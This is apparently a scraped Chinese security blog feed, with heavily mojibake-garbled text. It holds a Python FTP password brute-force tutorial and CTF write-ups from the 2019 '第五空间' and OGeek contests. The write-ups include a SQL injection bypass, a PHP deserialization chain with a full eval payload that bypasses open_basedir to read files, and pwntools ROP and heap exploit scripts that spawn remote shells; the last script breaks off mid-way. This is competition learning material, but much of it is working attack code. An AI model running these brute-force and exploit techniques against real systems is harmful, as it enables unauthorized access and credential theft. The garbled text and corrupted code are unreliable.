class="line"><span class="string"> </span></span><br><span class="line"><span class="string">with open(Passwordlist, 'r') as pw:  </span></span><br><span class="line"><span class="string">for word in pw: </span></span><br><span class="line"><span class="string">â word = word.strip ('\r').strip('\n') </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">â try: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">ftp = ftplib.FTP(server)  </span></span><br><span class="line"><span class="string">ftp.login(user, word) </span></span><br><span class="line"><span class="string">âprint (Success! The password is ' + word) </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">â‘ except: </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">print('still trying...') </span></span><br><span class="line"><span class="string">except: </span></span><br><span class="line"><span class="string">print ('Wordlist error')</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä½¿ç”¨ ftplib æ¨¡å—ä¸­çš„å·¥å…·æ¥å®ç° FTP åè®®ï¼Œæ‰€ä»¥é¦–å…ˆæˆ‘ä»¬å¯¼å…¥å®ƒã€‚ç„¶åï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåä¸º server çš„å˜é‡å’Œå¦ä¸€ä¸ªåä¸º user çš„å˜é‡ï¼Œå®ƒå°†å­˜å‚¨ä¸€äº›ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤ã€‚ä½ çš„è„šæœ¬å°†æç¤ºç”¨æˆ·è¾“å…¥ FTP æœåŠ¡å™¨çš„ IP åœ°å€âŠå’Œç”¨æˆ·å°è¯•è¿›å…¥çš„å¸æˆ·çš„ç”¨æˆ·åâ‹ã€‚<br>ç„¶åæˆ‘ä»¬è¯¢é—®ç”¨æˆ·å¯†ç åˆ—è¡¨âŒçš„è·¯å¾„ã€‚é€šè¿‡åœ¨ç»ˆç«¯ä¸­è¾“å…¥ locate wordlistï¼Œæ‚¨å¯ä»¥åœ¨ kali linux ä¸­æ‰¾åˆ°è®¸ å¤šå¯†ç åˆ—è¡¨ã€‚<br>ç„¶åï¼Œæˆ‘ä»¬å¼€å§‹ try ä»£ç å—ï¼Œè¯¥ä»£ç å°†ä½¿ç”¨ç”¨æˆ·æä¾›çš„å¯†ç åˆ—è¡¨æ¥å°è¯•ç ´è§£ç”¨æˆ·æä¾›çš„ç”¨æˆ·åçš„å¯†ç ã€‚</p><p>æ³¨æ„ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªæ–°çš„åä¸º strip()âçš„ python å‡½æ•°ã€‚æ­¤å‡½æ•°åˆ é™¤å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå­—ç¬¦ ï¼ˆåœ¨è¿™é‡Œæ˜¯å¯†ç åˆ—è¡¨ï¼‰ã€‚å¦‚æœæ­¤åˆ—è¡¨ä¸­çš„å¯†ç å‰é¢æœ‰ç©ºæ ¼æˆ–é€—å·ï¼Œåˆ™éœ€è¦æ‰§è¡Œæ­¤æ“ä½œã€‚strip()å‡½æ•°çš„ä½œç”¨æ˜¯ï¼š åˆ é™¤è¿™äº›å­—ç¬¦ï¼Œåªç•™ä¸‹æ½œåœ¨å¯†ç çš„å­—ç¬¦ä¸²ã€‚å¦‚æœæˆ‘ä»¬ä¸å»é™¤ç©ºç™½ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¾—åˆ°ä¸€ä¸ªå‡é˜´æ€§ã€‚<br>ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ç¬¬äºŒä¸ª tryâä»£ç å—ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬é¦–å…ˆä½¿ç”¨ ftplib æ¨¡å—è¿æ¥åˆ°ç”¨æˆ·æä¾›çš„ IP åœ°å€çš„æœåŠ¡ å™¨ï¼Œç„¶åä»è¯¥å¸æˆ·çš„å¯†ç åˆ—è¡¨ä¸­å°è¯•ä¸‹ä¸€ä¸ªå¯†ç ã€‚<br>å¦‚æœç”¨æˆ·åå’Œå¯†ç çš„ç»„åˆå¯¼è‡´é”™è¯¯ï¼Œåˆ™ä»£ç å—é€€å‡ºå¹¶è½¬åˆ° except å­å¥â‘ï¼Œåœ¨è¯¥å­å¥ä¸­æ‰“å° still tryingï¼Œ ç„¶åè¿”å›åˆ° for å­å¥çš„é¡¶éƒ¨å¹¶ä»å¯†ç åˆ—è¡¨ä¸­è·å–ä¸‹ä¸€ä¸ªå¯†ç ä»¥å°è¯•ã€‚<br>å¦‚æœç»„åˆæˆåŠŸï¼ŒæˆåŠŸçš„å¯†ç å°†ä¼šè¢«æ‰“å°åˆ°å±å¹•ä¸Šâã€‚æœ€åä¸€è¡Œè®°å½•ä»»ä½•å…¶ä»–å¯èƒ½å¯¼è‡´é”™è¯¯çš„æƒ…å†µã€‚ä¾‹ å¦‚ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥ç¨‹åºæ— æ³•å¤„ç†çš„å†…å®¹ï¼Œä¾‹å¦‚å•è¯è¡¨çš„è·¯å¾„é”™è¯¯æˆ–ç¼ºå°‘å•è¯è¡¨ã€‚<br>ç°åœ¨ï¼Œè®©æˆ‘ä»¬å¯¹ 192.168.1.101 çš„ FTP æœåŠ¡è¿è¡Œè¿™ä¸ªè„šæœ¬ï¼Œçœ‹çœ‹æ˜¯å¦å¯ä»¥ç ´è§£ root ç”¨æˆ·çš„å¯†ç ã€‚æˆ‘ä½¿ç”¨ çš„æ˜¯æˆ‘å·¥ä½œç›®å½•ä¸­åä¸º bigpasswordlist.txt çš„å¯†ç åˆ—è¡¨ã€‚å¦‚æœå¯†ç åˆ—è¡¨ä¸åœ¨ä½ çš„å·¥ä½œç›®å½•ä¸­ï¼Œæ‚¨å¯èƒ½éœ€è¦æ ä¾›åˆ°æ‰€ä½¿ç”¨å¯†ç åˆ—è¡¨çš„å®Œæ•´è·¯å¾„ï¼ˆä¾‹å¦‚ï¼Œ/usr/share/bigpasswordlist.txtï¼‰ã€‚ </p><p>å¦‚æœæƒ³è¦å­¦ä¹ æ›´å¤š Python çŸ¥è¯†ï¼Œå¼ºçƒˆæ¨èç”± Al Sweigart ç¼–å†™çš„ No Starch Press å‡ºç‰ˆç¤¾ çš„ä¼˜ç§€ä¹¦ç±ã€ŠAutomate the Boring Stuff with Python (2015)ã€‹ã€‚ </p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 ç¬¬äº”ç©ºé—´</title>
      <link href="/2019/08/29/2019%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/"/>
      <url>/2019/08/29/2019%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="ç©ºç›¸"><a href="#ç©ºç›¸" class="headerlink" title="ç©ºç›¸"></a>ç©ºç›¸</h2><p> ä¸€é“ç­¾åˆ°é¢˜ï¼Œæç¤ºå‚æ•°æ˜¯id  å°è¯•?id=1ä¸ºç¦æ­¢è¿›å…¥2ä¸ºtext  </p><p>?id=1â€™ or 1=1 ç»•è¿‡  </p><p>ç»™å‡ºflagçš„phpæ–‡ä»¶ï¼Œæäº¤tokenå¾—åˆ°flag</p><h2 id="å…«è‹¦"><a href="#å…«è‹¦" class="headerlink" title="å…«è‹¦"></a>å…«è‹¦</h2><p>ï¼ˆä¸‰é“webé¢˜ä¸­å”¯ä¸€æ­£å¸¸ä¸€ç‚¹çš„ï¼‰</p><p>ï¼ˆç¯å¢ƒå…³äº†ï¼Œæ—©ä¸Šåšå‡ºæ¥çš„é¢˜ï¼Œè®°ä¸å¤ªæ¸…äº†ï¼Œè®°é”™äº†ä¹Ÿï¼Œï¼Œ2333333ï¼‰</p><p>è¿›å…¥é¶æœºï¼Œå‘ç°åªæœ‰ä¸€ä¸ªwelcomeï¼Œå•¥ä¹Ÿæ²¡æœ‰ã€‚å„ç§å¤‡ä»½æ³„éœ²è¯•ä¸€æ³¢ï¼Œæœ€åå‘ç°æ˜¯phps</p><p>ç„¶åå¾—åˆ°æºç ï¼ˆuserç±»å½“æ—¶è§‰å¾—æ²¡ç”¨å°±åˆ äº†ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rror_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $careful;</span><br><span class="line">    <span class="keyword">public</span> $securuty = <span class="keyword">array</span>(<span class="string">'say_hello'</span>=&gt;<span class="string">'1'</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;careful===<span class="number">1</span>)&#123;</span><br><span class="line">            phpinfo();<span class="comment">// step 1:read source,get phpinfo and read it carefullt</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;securuty[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($param1,$param2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$param1&#125;)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'$a='</span>.$_GET[<span class="string">'dangerous'</span>].<span class="string">';'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®æç¤ºï¼Œå…ˆå»çœ‹phpinfo</p><p>æ„é€ åºåˆ—åŒ–</p><p><img src="https://i.loli.net/2020/04/30/L8aHUJR5WuMCbdr.png" alt="![](https://i.loli.net/2020/04/30/L8aHUJR5WuMCbdr.png)"></p><p>O:4:â€Testâ€:2:{s:10:â€ * carefulâ€;i:1;s:8:â€securutyâ€;a:1:{s:9:â€say_helloâ€;s:1:â€1â€;}}</p><p>å› ä¸ºprotectedçš„å…³ç³»ï¼Œå¥½åƒä¸­é—´æœ‰æˆªæ–­ï¼Œæ‰€ä»¥urlencodeï¼Œ</p><p>ç„¶åä¼ ç»™fooï¼Œå¾—åˆ°phpinfo</p><p>ctrl f æœç´¢.php å¾—åˆ°ä¸€ä¸ª preload.phpï¼ˆå…·ä½“å•¥åå­—å¿˜è®°äº†ï¼‰</p><p>ç„¶åå¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"welcome&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome_again</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $willing ;</span><br><span class="line">    <span class="keyword">public</span> $action ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;action=<span class="keyword">new</span> Welcome;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;willing)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;action-&gt;say_hello();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼äºå¼ºç½‘æ¯upload</p><p>å§¿åŠ¿ï¼š</p><p>ç”ŸæˆWelcome_again ç±»ï¼Œ</p><p>willing èµ‹å€¼ 1ï¼Œaction èµ‹å€¼ new Testï¼ˆï¼‰ï¼ŒTest ä¸­ èµ‹å€¼securuty ä»¥é”®å€¼å¯¹  â€˜say_helloâ€™=&gt; 1</p><p>åˆ©ç”¨é“¾ï¼š</p><p>é¦–å…ˆç”ŸæˆWelcome_again ç±»ï¼Œè°ƒç”¨__construct()æ–¹æ³•èµ‹å€¼action</p><p>ç„¶åè°ƒç”¨__destruct()æ–¹æ³•ï¼Œï¼ˆæ­¤æ—¶$this-&gt;willing=1ï¼‰</p><p>å› ä¸ºaction = new Test()</p><p>æ‰€ä»¥è°ƒç”¨  Test.say_hello()</p><p>ä½†æ˜¯Testæ²¡æœ‰è¯¥æ–¹æ³•ï¼Œæ‰€ä»¥è°ƒç”¨__call()æ–¹æ³•</p><p>ç„¶å  if($this-&gt;{$param1})</p><p>åˆæ²¡æœ‰æ”¹å±æ€§ï¼Œæ‰€ä»¥è°ƒç”¨__get()æ–¹æ³•</p><p>è¿”å›1ï¼ˆæˆ‘ä»¬ä¹‹å‰æ„é€ çš„é”®å€¼å¯¹ä¸­çš„å€¼ï¼‰</p><p>ç„¶åé€šè¿‡åˆ¤æ–­ï¼Œ</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">'$a='</span>.$_GET[<span class="string">'dangerous'</span>].<span class="string">';'</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ©ç”¨  ;  æˆªæ–­ï¼Œ</p><p>ä½¿å¾—evalæ‰§è¡Œä¸æ­¢ä¸€ä¸ªå‡½æ•°</p><p>ç„¶åç¿»å‡ºä¹‹å‰æ”¶è—çš„è¯»æ–‡ä»¶ä¸€æŠŠæ¢­ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="variable">$fp</span> = fopen(<span class="string">"./index.php"</span>,<span class="string">"r"</span>);<span class="variable">$str</span> = fread(<span class="variable">$fp</span>,filesize(<span class="string">"./index.php"</span>));<span class="built_in">echo</span> <span class="variable">$str</span> = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">1;<span class="built_in">echo</span> readfile(<span class="string">"./index.php"</span>);</span><br></pre></td></tr></table></figure><p>(å¿˜è®°å½“æ—¶ç”¨çš„å“ªä¸ªäº†)</p><p>å‘ç°æˆåŠŸ</p><p>ç„¶åå»è¯»flag</p><p>å‘ç°å¤±è´¥ï¼Œ</p><p>è¦bypass open_basedir</p><p>å‚è€ƒwp</p><p><a href="https://blog.csdn.net/systemino/article/details/94645518ä¸­çš„" target="_blank" rel="noopener">https://blog.csdn.net/systemino/article/details/94645518ä¸­çš„</a></p><p>å°è¯•æ„é€ ï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'/tmp'</span>);</span><br><span class="line"><span class="selector-tag">mkdir</span>(<span class="string">'sky'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'sky'</span>);</span><br><span class="line"><span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line"><span class="selector-tag">echo</span>(file_get_contents(<span class="string">'/var/www/flag.php'</span>));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><p>æœ€ç»ˆpayloadï¼š</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3Bi%3A0%3Bs%3A8%3A%22securuty%22%3Ba%3A1%3A%7Bs%3A9%3A%22say_hello%22%3Bs%3A1%3A%221%22%3B%7D%7D%7D</span><br><span class="line">&amp;dangerous=<span class="number">1</span>;<span class="keyword">chdir</span>(<span class="string">'/tmp'</span>);<span class="keyword">mkdir</span>(<span class="string">'sky'</span>);<span class="keyword">chdir</span>(<span class="string">'sky'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);echo(file_get_contents(<span class="string">'/var/www/flag.php'</span>));</span><br></pre></td></tr></table></figure><h2 id="å…­å°˜"><a href="#å…­å°˜" class="headerlink" title="å…­å°˜"></a>å…­å°˜</h2><p>éé¢„æœŸè§£</p><p>wwwscanæ‰«æåˆ°å­˜åœ¨logï¼Œ</p><p>è®¿é—®<a href="http://111.33.164.6:10005/log/access.log" target="_blank" rel="noopener">http://111.33.164.6:10005/log/access.log</a></p><p>æœç´¢flagå‘ç°<br><img src="https://i.loli.net/2020/04/30/xAfJQ89qsvkcOtr.png" alt="wwwscan"></p><p>ä¼¼ä¹æ˜¯åˆ«çš„è§£å‡ºé¢˜ç›®çš„é˜Ÿä¼å»æ‹¿flagæ—¶ç•™ä¸‹æ¥çš„æµé‡ï¼Ÿï¼ˆç™½å«–ä¸€æ‰‹ï¼‰</p><p>è¿›å»åŠ ä¸Štokenå³å¯å¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 OGeek</title>
      <link href="/2019/08/27/2019OGeek/"/>
      <url>/2019/08/27/2019OGeek/</url>
      
        <content type="html"><![CDATA[<h3 id="catch-fun"><a href="#catch-fun" class="headerlink" title="catch fun"></a>catch fun</h3><p>é¢˜ç›®æè¿°ï¼šoppo catch fun</p><p>â€‹        æç¤ºï¼šoppoâ€™s phone modelï¼Œflag{} is required</p><p>ç™¾åº¦ï¼š oppo catch fun</p><p><img src="https://i.loli.net/2020/04/30/xTf45hCVaZrkQGe.png" alt="catch fun"></p><p>æ ¹æ®æç¤ºå¾—åˆ°flag</p><p>flag{Reno}</p><h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><p>é¢˜ç›®æè¿°ï¼šFrom the ground up.</p><p>è¿™é“é¢˜ç®€å•çœ‹çœ‹ï¼Œstrncmpå‡½æ•°å¯ä»¥ç»•è¿‡ï¼Œv1å³æ¯”è¾ƒçš„é•¿åº¦å¯ä»¥æ§åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥éšæ„è¾“å…¥ä¸€ä¸ªæ•°å­—æ¯”å¦‚1ï¼Œç„¶åå’Œéšæœºæ•°æ¯”è¾ƒç¬¬ä¸€ä¸ªæ•°å­—ï¼Œçˆ†ç ´ç»•è¿‡ã€‚æ¥ç€å­˜åœ¨æ ˆæº¢å‡ºå¯èƒ½æ€§çš„å‡½æ•°çš„æº¢å‡ºé•¿åº¦æœ€å¤§ä¸º0xffï¼Œä¸”å¯ä»¥ç”±ä¸Šä¸€ä¸ªå‡½æ•°çš„è¾“å…¥æ¥æ§åˆ¶ã€‚å‰©ä¸‹çš„å°±æ˜¯ç®€å•çš„ropäº†ã€‚</p><p>expè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"><span class="meta">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#p = process(<span class="string">"./babyrop"</span>)</span></span><br><span class="line">p = remote(<span class="string">'47.112.137.238'</span>, <span class="number">13337</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyrop'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x080487D0</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'1'</span>+<span class="string">'\x00'</span>*<span class="number">6</span> + <span class="string">'\xff'</span> + <span class="string">'\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'\x00'</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeaf</span>) + p32(elf.plt[<span class="string">'puts'</span>]) + p32(vuln_addr) + p32(elf.got[<span class="string">'puts'</span>]) + p32(<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">libcbase = u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="meta">#libcbase = u32(p.recv(4).ljust(4, <span class="string">'\x00'</span>)) - 0x60ca0</span></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">'libcbase:%#x'</span> %libcbase)</span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="meta">#system_addr = libcbase + 0x3bda0</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x15902b</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'\x00'</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeaf</span>) + p32(system_addr) + p32(vuln_addr) + p32(bin_sh))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/Imwa5hQufLGrjTe.png" alt="babyrop"></p><h3 id="book-manager"><a href="#book-manager" class="headerlink" title="book manager"></a>book manager</h3><p>é¢˜ç›®æè¿°ï¼šEndless book writing.</p><p>ç®€å•é€†ä¸€ä¸‹ï¼Œå¯ä»¥å¾ˆå®¹æ˜“æ‰¾åˆ°addtextå‡½æ•°ä¸­å‡ºç°å †æº¢å‡ºï¼Œå½“v7çš„å€¼å°äº0x100æ—¶ï¼Œå¯ä»¥å¾€é‡Œé¢å†™å…¥0x100ä¸ªå­—èŠ‚ã€‚äºæ˜¯æ„é€ ä¸€ä¸‹å †ç»“æ„ï¼Œæ”¹å†™ä¸€ä¸ªtext_ptræŒ‡å‘å·²ç»é‡Šæ”¾åœ¨unsortedbinä¸­chunkï¼Œç„¶åshowbookï¼Œæ³„éœ²å‡ºlibcï¼Œç„¶åå†åˆ©ç”¨æº¢å‡ºä¿®æ”¹ä¸€ä¸ªtext_ptræŒ‡å‘free_hookï¼Œæ”¹å†™ä¸ºsystemå‡½æ•°åœ°å€ï¼Œç„¶åfreeä¸€ä¸ª/bin/shå³å¯getshellã€‚è„šæœ¬å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./bookmanager')</span></span><br><span class="line">p = remote(<span class="string">'47.112.115.30'</span>, <span class="number">13337</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddChapter</span><span class="params">(chapterName)</span>:</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Chapter name:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddSection</span><span class="params">(chapterName, sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    